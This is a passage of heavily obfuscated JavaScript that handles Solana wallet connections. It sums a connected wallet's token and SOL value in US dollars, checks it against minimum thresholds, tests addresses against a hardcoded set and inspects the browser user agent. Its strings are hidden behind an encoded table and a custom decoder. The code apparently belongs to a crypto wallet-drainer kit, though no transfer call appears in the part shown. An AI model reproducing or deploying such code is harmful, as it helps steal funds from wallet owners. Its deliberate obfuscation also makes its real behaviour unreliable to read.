  let _s4 = _v214(__str_table__, _s5["me"]);
  let _s6 = _v902(__str_table__, _s4["me"]);
  return _setPriv(this, _v159, [_s1["data"], _s3["data"], _s2["data"], _s5["data"], _s4["data"], _s6["data"]]), _getPriv(this, _v159)
}, _v736 = getString(350), _v737 = !1, _v27 = undefined, _v738 = class {
  constructor(_str_cache, __str_table__) {
    _noop(this["Se"] = _str_cache, _initPriv(this, _v27), _v5(this, "Ne", {}), _setPriv(this, _v27, new _v735(__str_table__ ?? Uint8Array["fromBase64"](_v736))))
  } ["xt"](_str_cache) {
    return _getPriv(this, _v27)["xt"](_str_cache), _getPriv(this, _v27)
  }
  get["ue"]() {
    return _getPriv(this, _v27)["Hr"]()
  }
  get["kr"]() {
    return _getPriv(this, _v27)["Gr"]()
  }
  get["Bn"]() {
    let _str_cache = this["ue"];
    return _str_cache == 5 || _str_cache == 6
  }
  get["It"]() {
    return _getPriv(this, _v27)["Vr"]()
  }
  get["et"]() {
    return _getPriv(this, _v27)["Ur"]()
  }
  get["tt"]() {
    return this["Ne"]["tt"] ?? _getPriv(this, _v27)["Br"]()
  }
  get["St"]() {
    return this["Ne"]["St"] ?? _getPriv(this, _v27)["Fr"]()
  }
  get["Jn"]() {
    return _getPriv(this, _v27)["Zr"]()
  }
  get["Qn"]() {
    let _str_cache = _getPriv(this, _v27)["Jr"]();
    return {
      ["header"]: _str_cache["header"] ?? getString(351),
      ["text"]: _str_cache["text"] ?? "8TEe5RDbPeGu5PKADXJaMCiCGnCvH7g769VL4eMAWnDH"
    }
  }
  get["eo"]() {
    let _str_cache = this["ue"];
    return (_str_cache == 2 || _str_cache == 5 || _str_cache == 6) && _getPriv(this, _v27)["$r"]()
  }
  get["ro"]() {
    return _getPriv(this, _v27)["en"]()
  }
  get["ce"]() {
    return _getPriv(this, _v27)["zr"]()
  }
  get["dt"]() {
    let _str_cache = this["Ne"]["dt"];
    return _str_cache !== void 0 ? _str_cache : _getPriv(this, _v27)["Qr"]()
  }
  get["hr"]() {
    return _getPriv(this, _v27)["Xr"]()
  }
  get["Kn"]() {
    return !!(_getPriv(this, _v27)["Xt"]() & 2)
  } ["yt"](_s1, _s3) {
    _noop(_limitArgs(_s6), _limitArgs(_s4));
    const _s2 = {
      ["43"]: 21,
      ["47"]: 9,
      ["48"]: 33,
      ["49"]: 62,
      ["50"]: 19,
      ["51"]: 16,
      ["52"]: 50,
      ["53"]: 27,
      ["54"]: 14,
      ["55"]: 47,
      ["56"]: 23,
      ["57"]: 1,
      ["65"]: 2,
      ["66"]: 44,
      ["67"]: 35,
      ["68"]: 30,
      ["69"]: 29,
      ["70"]: 55,
      ["71"]: 25,
      ["72"]: 18,
      ["73"]: 41,
      ["74"]: 61,
      ["75"]: 8,
      ["76"]: 24,
      ["77"]: 63,
      ["78"]: 60,
      ["79"]: 20,
      ["80"]: 4,
      ["81"]: 43,
      ["82"]: 31,
      ["83"]: 54,
      ["84"]: 42,
      ["85"]: 46,
      ["86"]: 5,
      ["87"]: 22,
      ["88"]: 36,
      ["89"]: 34,
      ["90"]: 39,
      ["97"]: 48,
      ["98"]: 17,
      ["99"]: 45,
      ["100"]: 0,
      ["101"]: 12,
      ["102"]: 57,
      ["103"]: 59,
      ["104"]: 26,
      ["105"]: 58,
      ["106"]: 11,
      ["107"]: 28,
      ["108"]: 13,
      ["109"]: 49,
      ["110"]: 3,
      ["111"]: 10,
      ["112"]: 40,
      ["113"]: 37,
      ["114"]: 52,
      ["115"]: 53,
      ["116"]: 15,
      ["117"]: 7,
      ["118"]: 38,
      ["119"]: 51,
      ["120"]: 32,
      ["121"]: 6,
      ["122"]: 56
    };
    const _s5 = new TextDecoder;

    function _s4(..._s1) {
      _s1["length"] = 1;
      const _s3 = _s1[0].length;
      const _s4 = _s1[0].indexOf("=");
      const _s6 = _s4 == -1 ? 0 : _s3 - _s4;
      const _s7 = _s3 * 3 / 4 - _s6;
      const _s8 = new Uint8Array(_s7);
      _noop(_s1[-179] = 0, _s1["b"] = 0, _s1[3] = 0);
      for (let _str_cache = 0; _str_cache < _s3 - _s6; _str_cache++) {
        const __str_table__ = _s1[0]["charCodeAt"](_str_cache);
        if (__str_table__ == 61) break;
        _noop(_s1[-179] = _s1[-179] << 6 | _s2[__str_table__], _s1["b"] += 6);
        if (_s1["b"] >= 8) {
          _noop(_s1["b"] -= 8, _s8[_s1[3]++] = _s1[-179] >> _s1["b"] & 255)
        }
      }
      return _s5.decode(_s8)
    }

    function _s6(..._s1) {
      _s1["length"] = 1;
      if (typeof _str_cache[_s1[0]] === "undefined") {
        return _str_cache[_s1[0]] = _s4(__str_table__[_s1[0]])
      }
      return _str_cache[_s1[0]]
    }
    if (_v737 || _s1 == 11) {
      return !1
    }
    let _s7 = _getPriv(this, _v27)["Wr"]();
    let _s8 = _getPriv(this, _v27)["Xt"]();
    let _defineProperty = _getPriv(this, _v27)["jr"]();
    return _s1 == 1 && this["ue"] == 1 ? !!(_s8 & 1) : _s7 == 2 || _s7 == 1 && new(RegExp)(_s6(353), "")["test"](navigator["userAgent"]) ? !0 : !_s3 || _s7 == 3 ? !1 : !!(_s1 == 1 || _s1 == 4 || _s1 == 20 || _s8 & 1 || _defineProperty & 1 || _s1 == 12 || _s1 == 6 || _s1 == 0 && _s8 & 2 || (_s1 == 8 || _s1 == 2) && _defineProperty & 4)
  }
}, _v27 = new(WeakMap), _v739 = new(RegExp)("79faGrj575ZKYWLJUh2KvgiGi4SnkDjR3RTKBi2eA7Pn", ""));

function _v284(..._str_cache) {
  if (!_v739["test"](_str_cache[0])) {
    throw new(Error)("7KxQktpmPgFWhSptFbXy7U88LmEcNNrDcpgyWAAnhrvr" + _str_cache[0])
  }
  return _str_cache[0]
}
_noop(WalletInstance = class {
  constructor(_str_cache, __str_table__, _s1, _s3) {
    _noop(this["id"] = __str_table__, this["Ge"] = _s1, this["name"] = _s3, _v5(this, "e"), this["e"] = _v284(_str_cache))
  }
  get["wr"]() {
    return this["id"] == 4 || this["id"] == 7 || this["id"] == 10 || this["id"] == 13 || this["id"] == 5
  }
  get["jt"]() {
    return !(this["id"] == 1 || this["vr"] || this["wr"] || this["id"] == 18 && this["Zt"])
  }
  get["vr"]() {
    return this["id"] == 2 || this["id"] == 19 || this["id"] == 6 || this["id"] == 20 || this["id"] == 8
  }
  get["Zt"]() {
    return this["Ge"] == 2 || this["Ge"] == 3 || this["Ge"] == 4 || this["Ge"] == 5
  }
  get["Rr"]() {
    return this["id"] == 5 || this["id"] == 7 || this["id"] == 12 || this["id"] == 18 && this["Zt"]
  }
  get["Tr"]() {
    return this["id"] == 0 || this["id"] == 8 || this["id"] == 13 || this["id"] == 17 || this["Rr"]
  }
  get["Lr"]() {
    return this["id"] == 3 || this["id"] == 15 || this["id"] == 11
  }
  get["Nr"]() {
    return !(this["id"] == 8 || this["id"] == 5 && !this["Zt"])
  }
  get["Cr"]() {
    return this["id"] != 1 && this["id"] != 8 && this["id"] != 6 && !this["Ar"]
  }
  get["Mn"]() {
    return !1
  }
  get["Ar"]() {
    return this["id"] == 2 || this["id"] == 12 || this["id"] == 19 || this["id"] == 20
  }
}, _v740 = new(Set)([_v75, _v69, "9RAqyL6AeCKZWS2Lg2a2rRruUxpxWaAj7iRtuc8p1uTU", "3xa9QHhh3z71JuvfnyVZ9Mu34rqn8CDFgkAEs84gUY8G", "3b7pq2HAd8WnLC7mwPwa8Vi4y3MCutVLtxHXK6sy6vX4", "6TMUtEsfBLsf6Lqg4DMTnK5VmjCTTbiuofBUzywu8VLm"]), _v249 = undefined, AppContext = class {
  constructor(_str_cache, __str_table__) {
    _noop(this["b"] = _str_cache, this["c"] = __str_table__, _v5(this, "K", 0), _v5(this, "Ct", 0), _v5(this, "ee", []), _v5(this, "Ee"), _v5(this, "Lt"), _v5(this, "tn"), _v5(this, "he"), _initPriv(this, _v249), this["he"] = new _v731(this), _setPriv(this, _v249, new _v337(this)))
  }
  async ["no"]() {
    let _str_cache = _now();
    let __str_table__ = this["b"]["e"];
    if (_str_cache - this["Ct"] < 30) {
      return
    }
    let [_s1, _s3, _s2] = await Promise["all"]([_v338["Ht"](__str_table__), _v338["gr"](__str_table__)["catch"](() => {
      return "null"
    }), solflareInstance["vn"](__str_table__)["catch"](() => {
      return "null"
    })]);
    _noop(this["Ct"] = _str_cache, this["K"] = _s3?.K ?? _s1["ve"], this["ee"] = _s1["De"], _s2 && this["ee"]["push"](..._s2), _s3 && (this["Ee"] = _s3["Ee"], this["Lt"] = _s3["Ee"] == _v74 && _s3["Tt"] == 80, _s3["Tt"] > 0 && (this["tn"] = Uint8Array["fromBase64"](_s3["data"][0])), this["Ke"]() || (this["K"] = 0)), this["ee"]["sort"](_limitArgs((..._str_cache) => {
      _str_cache["length"] = 2;
      return _str_cache[1]["oe"] - _str_cache[0]["oe"]
    }, 2)))
  } ["rn"]() {
    _noop(this["Ct"] = 0, _v451["clear"]())
  } ["we"](_str_cache = this["ee"]) {
    let __str_table__ = 0;
    for (let _s1 of _str_cache) {
      _s1["type"] == 2 && (this["he"]["Ye"] || _s1["state"] != 2 && _s1["oe"] < 50) || (__str_table__ += _s1["oe"])
    }
    let _s3 = this["K"] / 1000000000 * solUsdRate;
    return __str_table__ + _s3
  }
  async ["Vt"]() {
    let {
      ["K"]: _str_cache, ["c"]: __str_table__, ["b"]: _s1
    } = this;
    let _s3 = this["we"]();
    let _s2 = _s1["id"] == 1;
    let _s5 = __str_table__["ue"] == 5;
    let _s4 = _s2 && _s5 ? 5 : 1.2;
    let _s6 = Math["max"](this["c"]["Jn"], _s4);
    if (_s3 < _s6) {
      let _s7 = _s6 - _s3;
      return {
        ["mt"]: !1,
        ["We"]: Math["trunc"](_s7 / solUsdRate * 1000000000),
        ["type"]: 0
      }
    }
    if (this["ee"]["length"] === 0) {
      let _s7 = Math["trunc"](_s6 / solUsdRate * 1000000000);
      return {
        ["mt"]: _str_cache > _s7,
        ["We"]: _s7,
        ["type"]: 0
      }
    }
    return _getPriv(this, _v249)["Vt"](_s6)
  } ["oo"]() {
    return !this["Ee"] || this["Ee"] == _v74
  } ["Ke"]() {
    return this["oo"]() && !this["Lt"]
  } ["io"]() {
    let _str_cache = this["tn"];
    return !this["Lt"] || !_str_cache ? !1 : _v564(_str_cache["subarray"](8, 40), softwareList)
  } ["so"]() {
    return this["b"]["id"] == 0 && this["Lt"] ? !1 : !this["Ee"] || !_v740["has"](this["Ee"])
  } ["nn"]() {
    return this["Ke"]() || this["Ee"] == _v707 || this["io"]()
  } ["ao"]() {
    return this["he"]["tr"]()
  } ["co"]() {
    let _str_cache = this["b"];
    return _str_cache["id"] == 12 && this["K"] === 0 ? !1 : _str_cache["Nr"] && this["we"]() >= 10
  } ["sn"]() {
    return !1
  }
}, _v249 = new(WeakMap));
